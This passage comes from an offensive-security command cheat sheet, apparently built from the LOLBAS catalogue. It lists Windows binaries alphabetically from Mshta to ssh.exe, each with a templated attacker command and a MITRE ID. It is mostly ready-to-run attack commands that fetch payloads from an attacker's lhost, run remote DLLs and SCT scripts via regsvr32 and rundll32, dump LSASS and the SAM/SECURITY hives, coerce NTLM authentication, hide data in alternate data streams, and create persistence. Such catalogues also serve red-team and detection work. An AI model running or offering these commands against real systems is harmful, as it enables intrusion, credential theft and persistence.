*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
mshta.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Msiexec.exe

Used by Windows to execute msi files

**Path(s):**
- `C:\Windows\System32\msiexec.exe`
- `C:\Windows\SysWOW64\msiexec.exe`

### Msiexec.exe Execute #1

Installs the target .MSI file silently.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Installs the target .MSI file silently"
msiexec /quiet /i $file_out
```
<!-- cheat
var file_out
-->

### Msiexec.exe Execute #2

Installs the target remote & renamed .MSI file silently.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Installs the target remote & renamed .MSI file silently"
msiexec /q /i $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Msiexec.exe Execute #3

Calls DllRegisterServer to register the target DLL.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Calls DllRegisterServer to register the target DLL"
msiexec /y $file_out
```
<!-- cheat
var file_out
-->

### Msiexec.exe Execute #4

Calls DllUnregisterServer to un-register the target DLL.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Calls DllUnregisterServer to un-register the target DLL"
msiexec /z $file_out
```
<!-- cheat
var file_out
-->

### Msiexec.exe Execute #5

Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.

*Privileges: User • MITRE: T1218.007*

```cmd title:"Lolbas Installs the target .MSI file from a remote URL, the file can be signed by vendor"
msiexec /i $file_out TRANSFORMS="$scheme://$lhost:$lport/$file" /qb
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
var file_out
-->

## Netsh.exe

Netsh is a Windows tool used to manipulate network interface settings.

**Path(s):**
- `C:\WINDOWS\System32\Netsh.exe`
- `C:\WINDOWS\SysWOW64\Netsh.exe`

### Netsh.exe Execute

Use Netsh in order to execute a .dll file and also gain persistence, every time the netsh command is called

*Privileges: Admin • MITRE: T1546.007*

```cmd title:"Lolbas Netsh.exe Execute"
netsh.exe add helper $file_out
```
<!-- cheat
var file_out
-->

## Ngen.exe

Microsoft Native Image Generator.

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe`

### Ngen.exe Download

Downloads payload from remote server using the Microsoft Native Image Generator utility.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Downloads payload from remote server using the Microsoft Native Image Generator utility"
ngen.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## odbcad32.exe

ODBC Data Source Administrator to manage User/System DSNs and ODBC drivers.

**Path(s):**
- `c:\windows\system32\odbcad32.exe`
- `c:\windows\syswow64\odbcad32.exe`

### odbcad32.exe UAC Bypass

Launch odbcad32.exe GUI, click 'Tracing' tab, click 'Browsing' button, enter abitrary command in the File Dialog's path, press enter.

*Privileges: User • MITRE: T1548.002*

```cmd title:"Lolbas odbcad32.exe UAC Bypass"
odbcad32.exe
```
<!-- cheat
-->

## Odbcconf.exe

Used in Windows for managing ODBC connections

**Path(s):**
- `C:\Windows\System32\odbcconf.exe`
- `C:\Windows\SysWOW64\odbcconf.exe`

### Odbcconf.exe Execute #1

Execute DllRegisterServer from DLL specified.

*Privileges: User • MITRE: T1218.008*

```cmd title:"Lolbas Execute DllRegisterServer from DLL specified"
odbcconf /a $regsvr_file_out
```
<!-- cheat
var file_out
var regsvr_file_out
-->

### Odbcconf.exe Execute #2

Install a driver and load the DLL. Requires administrator privileges.

*Privileges: User • MITRE: T1218.008*

```cmd title:"Lolbas Install a driver and load the DLL. Requires administrator privileges"
odbcconf INSTALLDRIVER "lolbas-project|Driver=$file_out|APILevel=2"
odbcconf configsysdsn "lolbas-project" "DSN=lolbas-project"
```
<!-- cheat
var file_out
-->

### Odbcconf.exe Execute #3

Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.

*Privileges: Administrator • MITRE: T1218.008*

```cmd title:"Lolbas Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file"
odbcconf -f $file_out
```
<!-- cheat
var file_out
-->

## OfflineScannerShell.exe

Windows Defender Offline Shell

**Path(s):**
- `C:\Program Files\Windows Defender\Offline\OfflineScannerShell.exe`

### OfflineScannerShell.exe Execute

Execute mpclient.dll library in the current working directory

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Execute mpclient.dll library in the current working directory"
OfflineScannerShell
```
<!-- cheat
-->

## OneDriveStandaloneUpdater.exe

OneDrive Standalone Updater

**Path(s):**
- `C:\Users\<username>\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe`
- `C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe`
- `C:\Program Files (x86)\Microsoft OneDrive\OneDriveStandaloneUpdater.exe`

### OneDriveStandaloneUpdater.exe Download

Download a file from the web address specified in `HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC`. `ODSUUpdateXMLUrlFromOC` and `UpdateXMLUrlFromOC` must be equal to non-empty string values in that same registry key. `UpdateOfficeConfigTimestamp` is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in `%localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json`.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas OneDriveStandaloneUpdater.exe Download"
reg add "HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC" /ve /d "$file_in" /f
OneDriveStandaloneUpdater
```
<!-- cheat
var file_in
-->

## Pcalua.exe

Program Compatibility Assistant

**Path(s):**
- `C:\Windows\System32\pcalua.exe`

### Pcalua.exe Execute #1

Open the target .EXE using the Program Compatibility Assistant.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Open the target .EXE using the Program Compatibility Assistant"
pcalua.exe -a $file_out
```
<!-- cheat
var file_out
-->

### Pcalua.exe Execute #2

Open the target .DLL file with the Program Compatibilty Assistant.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Open the target .DLL file with the Program Compatibilty Assistant"
pcalua.exe -a \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

### Pcalua.exe Execute #3

Open the target .CPL file with the Program Compatibility Assistant.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Open the target .CPL file with the Program Compatibility Assistant"
pcalua.exe -a $file_out -c Java
```
<!-- cheat
var file_out
-->

## Pcwrun.exe

Program Compatibility Wizard

**Path(s):**
- `C:\Windows\System32\pcwrun.exe`

### Pcwrun.exe Execute #1

Open the target .EXE file with the Program Compatibility Wizard.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Open the target .EXE file with the Program Compatibility Wizard"
Pcwrun.exe $file_out
```
<!-- cheat
var file_out
-->

### Pcwrun.exe Execute #2

Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries"
Pcwrun.exe /../../$(calc).exe
```
<!-- cheat
-->

## Pktmon.exe

Capture Network Packets on the windows 10 with October 2018 Update or later.

**Path(s):**
- `c:\windows\system32\pktmon.exe`
- `c:\windows\syswow64\pktmon.exe`

### Pktmon.exe Reconnaissance #1

Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop

*Privileges: Administrator • MITRE: T1040*

```cmd title:"Lolbas Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop"
pktmon.exe start --etw
```
<!-- cheat
-->

### Pktmon.exe Reconnaissance #2

Select Desired ports for packet capture

*Privileges: Administrator • MITRE: T1040*

```cmd title:"Lolbas Select Desired ports for packet capture"
pktmon.exe filter add -p 445
```
<!-- cheat
-->

## Pnputil.exe

Used for installing drivers

**Path(s):**
- `C:\Windows\system32\pnputil.exe`

### Pnputil.exe Execute

Used for installing drivers

*Privileges: Administrator • MITRE: T1547*

```cmd title:"Lolbas Used for installing drivers"
pnputil.exe -i -a $file_out
```
<!-- cheat
var file_out
-->

## Presentationhost.exe

File is used for executing Browser applications

**Path(s):**
- `C:\Windows\System32\Presentationhost.exe`
- `C:\Windows\SysWOW64\Presentationhost.exe`

### Presentationhost.exe Execute #1

Executes the target XAML Browser Application (XBAP) file

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes the target XAML Browser Application (XBAP) file"
Presentationhost.exe $file_out
```
<!-- cheat
var file_out
-->

### Presentationhost.exe Download #2

It will download a remote payload and place it in INetCache.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas It will download a remote payload and place it in INetCache"
Presentationhost.exe $scheme://$lhost:$lport/$file
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

## Print.exe

Used by Windows to send files to the printer

**Path(s):**
- `C:\Windows\System32\print.exe`
- `C:\Windows\SysWOW64\print.exe`

### Print.exe ADS #1

Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Copy file.exe into the Alternate Data Stream (ADS) of file.txt"
print /D:$file_out:file.exe $file_out
```
<!-- cheat
var file_out
-->

### Print.exe Copy #2

Copy file from source to destination

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy file from source to destination"
print /D:$file_out $file_out
```
<!-- cheat
var file_out
-->

### Print.exe Copy #3

Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy File.exe from a network share to the target c:\OutFolder\outfile.exe"
print /D:$file_out \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

## PrintBrm.exe

Printer Migration Command-Line Tool

**Path(s):**
- `C:\Windows\System32\spool\tools\PrintBrm.exe`

### PrintBrm.exe Download #1

Create a ZIP file from a folder in a remote drive

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Create a ZIP file from a folder in a remote drive"
PrintBrm -b -d \\$lhost\$share\$file -f $file_out
```
<!-- cheat
import tun_ip
var file
var file_out
var share
-->

### PrintBrm.exe ADS #2

Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder"
PrintBrm -r -f $file_out:hidden.zip -d $dir
```
<!-- cheat
var dir
var file_out
-->

## Provlaunch.exe

Launcher process

**Path(s):**
- `c:\windows\system32\provlaunch.exe`

### Provlaunch.exe Execute

Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Executes command defined in the Registry"
provlaunch.exe LOLBin
```
<!-- cheat
-->

## Psr.exe

Windows Problem Steps Recorder, used to record screen and clicks.

**Path(s):**
- `c:\windows\system32\psr.exe`
- `c:\windows\syswow64\psr.exe`

### Psr.exe Reconnaissance

Record a user screen without creating a GUI. You should use "psr.exe /stop" to stop recording and create output file.

*Privileges: User • MITRE: T1113*

```cmd title:"Lolbas Record a user screen without creating a GUI"
psr.exe /start /output $file_out /sc 1 /gui 0
```
<!-- cheat
var file_out
-->

## Query.exe

Remote Desktop Services MultiUser Query Utility

**Path(s):**
- `c:\windows\system32\query.exe`
- `c:\windows\syswow64\query.exe`

### Query.exe Execute

Once executed, `query.exe` will execute `quser.exe` in the same folder. Thus, if `query.exe` is copied to a folder and an arbitrary executable is renamed to `quser.exe`, `query.exe` will spawn it. Instead of `user`, it is also possible to use `session`, `termsession` or `process` as command-line option.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Once executed, query.exe will execute quser.exe in the same folder"
query.exe user
```
<!-- cheat
-->

## Rasautou.exe

Windows Remote Access Dialer

**Path(s):**
- `C:\Windows\System32\rasautou.exe`

### Rasautou.exe Execute

Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.

*Privileges: User, Administrator in Windows 8 • MITRE: T1218*

```cmd title:"Lolbas Loads the target .DLL specified in -d and executes the export specified in -p"
rasautou -d $file_out -p export_name -a a -e e
```
<!-- cheat
var file_out
-->

## rdrleakdiag.exe

Microsoft Windows resource leak diagnostic tool

**Path(s):**
- `c:\windows\system32\rdrleakdiag.exe`
- `c:\Windows\SysWOW64\rdrleakdiag.exe`

### rdrleakdiag.exe Dump #1

Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

*Privileges: User • MITRE: T1003*

```cmd title:"Lolbas Dump process by PID with rdrleakdiag"
rdrleakdiag.exe /p 940 /o $dir /fullmemdmp /wait 1
```
<!-- cheat
var dir
-->

### rdrleakdiag.exe Dump #2

Dump LSASS process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

*Privileges: Administrator • MITRE: T1003.001*

```cmd title:"Lolbas Dump LSASS by PID with rdrleakdiag"
rdrleakdiag.exe /p 832 /o $dir /fullmemdmp /wait 1
```
<!-- cheat
var dir
-->

### rdrleakdiag.exe Dump #3

After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).

*Privileges: Administrator • MITRE: T1003.001*

```cmd title:"Lolbas Snapshot subsequent process dump with rdrleakdiag"
rdrleakdiag.exe /p 832 /o $dir /fullmemdmp /snap
```
<!-- cheat
var dir
-->

## Reg.exe

Used to manipulate the registry

**Path(s):**
- `C:\Windows\System32\reg.exe`
- `C:\Windows\SysWOW64\reg.exe`

### Reg.exe ADS #1

Export the target Registry key and save it to the specified .REG file within an Alternate data stream.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Reg.exe ADS #1"
reg export HKLM\SOFTWARE\Microsoft\Evilreg $file_out:evilreg.reg
```
<!-- cheat
var file_out
-->

### Reg.exe Credentials #2

Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material

*Privileges: Administrator • MITRE: T1003.002*

```cmd title:"Lolbas Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material"
reg save HKLM\SECURITY $file_out && reg save HKLM\SYSTEM $file_out && reg save HKLM\SAM $file_out
```
<!-- cheat
var file_out
-->

## Regasm.exe

Part of .NET

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe`

### Regasm.exe AWL Bypass #1

Loads the target .NET DLL file and executes the RegisterClass function.

*Privileges: Local Admin • MITRE: T1218.009*

```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
regasm.exe $file_out
```
<!-- cheat
var file_out
-->

### Regasm.exe Execute #2

Loads the target .DLL file and executes the UnRegisterClass function.

*Privileges: User • MITRE: T1218.009*

```cmd title:"Lolbas Loads the target .DLL file and executes the UnRegisterClass function"
regasm.exe /U $file_out
```
<!-- cheat
var file_out
-->

## Regedit.exe

Used by Windows to manipulate registry

**Path(s):**
- `C:\Windows\regedit.exe`

### Regedit.exe ADS #1

Export the target Registry key to the specified .REG file.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Export the target Registry key to the specified .REG file"
regedit /E $file_out:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
```
<!-- cheat
var file_out
-->

### Regedit.exe ADS #2

Import the target .REG file into the Registry.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Import the target .REG file into the Registry"
regedit $file_out:regfile.reg
```
<!-- cheat
var file_out
-->

## Regini.exe

Used to manipulate the registry

**Path(s):**
- `C:\Windows\System32\regini.exe`
- `C:\Windows\SysWOW64\regini.exe`

### Regini.exe ADS

Write registry keys from data inside the Alternate data stream.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Write registry keys from data inside the Alternate data stream"
regini.exe $file_out:hidden.ini
```
<!-- cheat
var file_out
-->

## Register-cimprovider.exe

Used to register new wmi providers

**Path(s):**
- `C:\Windows\System32\Register-cimprovider.exe`
- `C:\Windows\SysWOW64\Register-cimprovider.exe`

### Register-cimprovider.exe Execute

Load the target .DLL.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Load the target .DLL"
Register-cimprovider -path $file_out
```
<!-- cheat
var file_out
-->

## Regsvcs.exe

Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies

**Path(s):**
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegSvcs.exe`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe`
- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`

### Regsvcs.exe Execute #1

Loads the target .NET DLL file and executes the RegisterClass function.

*Privileges: User • MITRE: T1218.009*

```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
regsvcs.exe $file_out
```
<!-- cheat
var file_out
-->

### Regsvcs.exe AWL Bypass #2

Loads the target .NET DLL file and executes the RegisterClass function.

*Privileges: Local Admin • MITRE: T1218.009*

```cmd title:"Lolbas Loads the target .NET DLL file and executes the RegisterClass function"
regsvcs.exe $file_out
```
<!-- cheat
var file_out
-->

## Regsvr32.exe

Used by Windows to register dlls

**Path(s):**
- `C:\Windows\System32\regsvr32.exe`
- `C:\Windows\SysWOW64\regsvr32.exe`

### Regsvr32.exe AWL Bypass #1

Execute the specified remote .SCT script with scrobj.dll.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute the specified remote .SCT script with scrobj.dll"
regsvr32 /s /n /u /i:$scheme://$lhost:$lport/$file scrobj.dll
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Regsvr32.exe AWL Bypass #2

Execute the specified local .SCT script with scrobj.dll.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute the specified local .SCT script with scrobj.dll"
regsvr32.exe /s /u /i:$file_out scrobj.dll
```
<!-- cheat
var file_out
-->

### Regsvr32.exe Execute #3

Execute the specified remote .SCT script with scrobj.dll.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute the specified remote .SCT script with scrobj.dll"
regsvr32 /s /n /u /i:$scheme://$lhost:$lport/$file scrobj.dll
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Regsvr32.exe Execute #4

Execute the specified local .SCT script with scrobj.dll.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute the specified local .SCT script with scrobj.dll"
regsvr32.exe /s /u /i:$file_out scrobj.dll
```
<!-- cheat
var file_out
-->

### Regsvr32.exe Execute #5

Execute code in a DLL. The code must be inside the exported function `DllRegisterServer`.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute code in a DLL. The code must be inside the exported function DllRegisterServer"
regsvr32.exe /s $file_out
```
<!-- cheat
var file_out
-->

### Regsvr32.exe Execute #6

Execute code in a DLL. The code must be inside the exported function `DllUnRegisterServer`.

*Privileges: User • MITRE: T1218.010*

```cmd title:"Lolbas Execute code in a DLL. The code must be inside the exported function DllUnRegisterServer"
regsvr32.exe /u /s $file_out
```
<!-- cheat
var file_out
-->

## Replace.exe

Used to replace file with another file

**Path(s):**
- `C:\Windows\System32\replace.exe`
- `C:\Windows\SysWOW64\replace.exe`

### Replace.exe Copy #1

Copy .cab file to destination

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Copy .cab file to destination"
replace.exe $file_out $dir /A
```
<!-- cheat
var dir
var file_out
-->

### Replace.exe Download #2

Download/Copy executable to specified folder

*Privileges: User • MITRE: T1105*

```cmd title:"Lolbas Download/Copy executable to specified folder"
replace.exe \\$lhost\$share\$file $dir /A
```
<!-- cheat
import tun_ip
var dir
var file
var share
-->

## Reset.exe

Remote Desktop Services Reset Utility

**Path(s):**
- `c:\windows\system32\reset.exe`
- `c:\windows\syswow64\reset.exe`

### Reset.exe Execute

Once executed, `reset.exe` will execute `rwinsta.exe` in the same folder. Thus, if `reset.exe` is copied to a folder and an arbitrary executable is renamed to `rwinsta.exe`, `reset.exe` will spawn it.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Once executed, reset.exe will execute rwinsta.exe in the same folder"
reset.exe session
```
<!-- cheat
-->

## Rpcping.exe

Used to verify rpc connection

**Path(s):**
- `C:\Windows\System32\rpcping.exe`
- `C:\Windows\SysWOW64\rpcping.exe`

### Rpcping.exe Credentials #1

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

*Privileges: User • MITRE: T1003*

```cmd title:"Lolbas Rpcping.exe Credentials #1"
rpcping -s $lhost -e 1234 -a privacy -u NTLM
```
<!-- cheat
import tun_ip
-->

### Rpcping.exe Credentials #2

Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).

*Privileges: User • MITRE: T1187*

```cmd title:"Lolbas Rpcping.exe Credentials #2"
rpcping /s $lhost /e 9997 /a connect /u NTLM
```
<!-- cheat
import tun_ip
-->

## Rundll32.exe

Used by Windows to execute dll files

**Path(s):**
- `C:\Windows\System32\rundll32.exe`
- `C:\Windows\SysWOW64\rundll32.exe`

### Rundll32.exe Execute #1

First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Rundll32.exe Execute #1"
rundll32.exe $file_out,EntryPoint
```
<!-- cheat
var file_out
-->

### Rundll32.exe Execute #2

Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Execute a DLL from an SMB share"
rundll32.exe \\$lhost\$share\$file,EntryPoint
```
<!-- cheat
import tun_ip
var file
var share
-->

### Rundll32.exe Execute #3

Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$scheme://$lhost:$lport/$file")
```
<!-- cheat
import tun_ip
import lports
import scheme
var file
-->

### Rundll32.exe ADS #4

Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)"
rundll32 "$file_out:ADSDLL.dll",DllMain
```
<!-- cheat
var file_out
-->

### Rundll32.exe Execute #5

Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.

*Privileges: User • MITRE: T1218.011*

```cmd title:"Lolbas Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID"
rundll32.exe -sta $clsid
```
<!-- cheat
var clsid
-->

## Runexehelper.exe

Launcher process

**Path(s):**
- `c:\windows\system32\runexehelper.exe`

### Runexehelper.exe Execute

Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing, writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Launches the specified exe"
runexehelper.exe $file_out
```
<!-- cheat
var file_out
-->

## Runonce.exe

Executes a Run Once Task that has been configured in the registry

**Path(s):**
- `C:\Windows\System32\runonce.exe`
- `C:\Windows\SysWOW64\runonce.exe`

### Runonce.exe Execute

Executes a Run Once Task that has been configured in the registry.

*Privileges: Administrator • MITRE: T1218*

```cmd title:"Lolbas Executes a Run Once Task that has been configured in the registry"
Runonce.exe /AlternateShellStartup
```
<!-- cheat
-->

## Runscripthelper.exe

Execute target PowerShell script

**Path(s):**
- `C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe`
- `C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\Runscripthelper.exe`

### Runscripthelper.exe Execute

Execute the PowerShell script with .txt extension

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute the PowerShell script with .txt extension"
runscripthelper.exe surfacecheck \\?\$file_out $dir
```
<!-- cheat
var dir
var file_out
-->

## Sc.exe

Used by Windows to manage services

**Path(s):**
- `C:\Windows\System32\sc.exe`
- `C:\Windows\SysWOW64\sc.exe`

### Sc.exe ADS #1

Creates a new service and executes the file stored in the ADS.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Creates a new service and executes the file stored in the ADS"
sc create evilservice binPath="\"$ads_file" /c echo works > \"$ads_file"" DisplayName= "evilservice" start= auto\ & sc start evilservice
```
<!-- cheat
var ads_file
-->

### Sc.exe ADS #2

Modifies an existing service and executes the file stored in the ADS.

*Privileges: User • MITRE: T1564.004*

```cmd title:"Lolbas Modifies an existing service and executes the file stored in the ADS"
sc config $existingservicename binPath="\"$ads_file" /c echo works > \"$ads_file"" & sc start $existingservicename
```
<!-- cheat
var ads_file
var existingservicename
-->

## Schtasks.exe

Schedule periodic tasks

**Path(s):**
- `c:\windows\system32\schtasks.exe`
- `c:\windows\syswow64\schtasks.exe`

### Schtasks.exe Execute #1

Create a recurring task to execute every minute.

*Privileges: User • MITRE: T1053.005*

```cmd title:"Lolbas Create a recurring task to execute every minute"
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr "$cmd"
```
<!-- cheat
var cmd
-->

### Schtasks.exe Execute #2

Create a scheduled task on a remote computer for persistence/lateral movement

*Privileges: Administrator • MITRE: T1053.005*

```cmd title:"Lolbas Create a scheduled task on a remote computer for persistence/lateral movement"
schtasks /create /s targetmachine /tn "MyTask" /tr "$cmd" /sc daily
```
<!-- cheat
var cmd
-->

## Scriptrunner.exe

Execute binary through proxy binary to evade defensive counter measures

**Path(s):**
- `C:\Windows\System32\scriptrunner.exe`
- `C:\Windows\SysWOW64\scriptrunner.exe`

### Scriptrunner.exe Execute #1

Executes executable

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes executable"
Scriptrunner.exe -appvscript $file_out
```
<!-- cheat
var file_out
-->

### Scriptrunner.exe Execute #2

Executes cmd file from remote server

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Executes cmd file from remote server"
ScriptRunner.exe -appvscript \\$lhost\$share\$file
```
<!-- cheat
import tun_ip
var file
var share
-->

## Setres.exe

Configures display settings

**Path(s):**
- `c:\windows\system32\setres.exe`

### Setres.exe Execute

Sets the resolution and then launches 'choice' command from the working directory.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Sets the resolution and then launches 'choice' command from the working directory"
setres.exe -w 800 -h 600
```
<!-- cheat
-->

## SettingSyncHost.exe

Host Process for Setting Synchronization

**Path(s):**
- `C:\Windows\System32\SettingSyncHost.exe`
- `C:\Windows\SysWOW64\SettingSyncHost.exe`

### SettingSyncHost.exe Execute #1

Execute file specified in %COMSPEC%

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Execute file specified in %COMSPEC%"
SettingSyncHost -LoadAndRunDiagScript $file_out
```
<!-- cheat
var file_out
-->

### SettingSyncHost.exe Execute #2

Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas SettingSyncHost.exe Execute #2"
SettingSyncHost -LoadAndRunDiagScriptNoCab $file_out
```
<!-- cheat
var file_out
-->

## Sftp.exe

sftp.exe is a Windows command-line utility that uses the Secure File Transfer Protocol (SFTP) to securely transfer files between a local machine and a remote server.

**Path(s):**
- `C:\Windows\System32\OpenSSH\sftp.exe`

### Sftp.exe Execute

Spawns ssh.exe which in turn spawns the specified command line. See also this project's entry for ssh.exe.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Spawns ssh.exe which in turn spawns the specified command line"
sftp -o ProxyCommand="$cmd" .
```
<!-- cheat
var cmd
-->

## Sigverif.exe

File Signature Verification utility to verify digital signatures of files

**Path(s):**
- `C:\Windows\System32\sigverif.exe`
- `C:\Windows\SysWOW64\sigverif.exe`

### Sigverif.exe Execute

Launch sigverif.exe GUI, click 'Advanced', specify arbitrary executable path as 'log file name', then click 'View Log' to execute the binary.

*Privileges: User • MITRE: T1218*

```cmd title:"Lolbas Sigverif.exe Execute"
sigverif.exe
```
<!-- cheat
-->

## ssh.exe

Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.

**Path(s):**
- `c:\windows\system32\OpenSSH\ssh.exe`

### ssh.exe Execute #1

Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.

*Privileges: User • MITRE: T1202*

```cmd title:"Lolbas Executes specified command on host machine"
